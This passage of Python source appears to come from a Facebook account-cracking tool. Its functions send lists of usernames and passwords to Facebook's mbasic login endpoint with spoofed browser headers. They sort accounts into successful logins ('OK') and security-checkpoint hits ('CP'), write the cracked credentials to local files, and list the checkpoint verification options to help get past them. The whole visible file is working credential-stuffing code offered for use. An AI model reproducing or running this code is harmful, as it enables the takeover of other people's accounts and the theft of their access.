				print("\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒\033[0;97m‒\033[0;91m‒")
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_DALL(kuki)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_opsi():
	c = len(akun)
	hu = '#'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] INPUT')
	cek = '# PROSESES CO'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '#INTERNET NO CONNECTED'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass
login()